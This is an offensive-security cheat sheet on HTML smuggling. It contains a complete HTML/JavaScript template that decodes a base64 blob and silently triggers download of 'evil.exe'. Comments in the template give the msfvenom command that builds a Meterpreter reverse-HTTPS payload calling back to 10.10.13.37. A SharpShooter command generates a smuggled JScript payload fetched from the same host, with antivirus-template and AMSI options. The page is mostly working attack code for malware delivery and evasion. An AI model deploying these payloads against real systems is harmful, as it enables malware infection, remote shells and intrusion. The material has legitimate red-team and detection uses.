# HTML Smuggling

* [https://github.com/nccgroup/demiguise](https://github.com/nccgroup/demiguise)

How-to:

1. Base64 code is placed into an array buffer, byte-by-byte.
2. The array buffer is placed into the binary blob.
3. A hidden `a` tag is created.
4. The data from the binary blob is moved to the href reference of the `a` tag.
5. The code from the binary blob is given the file name of `evil.exe`.
6. Finally, a click action is performed to download the file.

{% code title="smuggling.html" %}
```html
<html>
   <body>
      <script>
         function base64ToArrayBuffer(base64) {
             var binary_string = window.atob(base64);
             var len = binary_string.length;
             var bytes = new Uint8Array( len );
             for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
             return bytes.buffer;
         }
         // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 -f exe -o evil.exe
         // base64 -w0 evil.exe | xclip -i -sel clipboard
         var file ='<METERPRETER_BASE64_CONTENTS>'
         var data = base64ToArrayBuffer(file);
         var blob = new Blob([data], {type: 'octet/stream'});
         var fileName = 'evil.exe';
         var a = document.createElement('a');
         document.body.appendChild(a);
         a.style = 'display: none';
         var url = window.URL.createObjectURL(blob);
         a.href = url;
         a.download = fileName;
         a.click();
         window.URL.revokeObjectURL(url);
      </script>
   </body>
</html>
```
{% endcode %}

{% hint style="warning" %}
This page will work when browsed with Google Chrome (since it supports `window.URL.createObjectURL`). This technique must be modified to work against browsers like IE or Microsoft Edge.
{% endhint %}




## SharpShooter

* [https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/)
* [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

```
$ python SharpShooter.py --payload js --delivery web --output evil --web http://10.10.13.37/evil.js --shellcode --scfile evil.bin --smuggle --template mcafee --dotnetver 4 --amsi amsienable
```
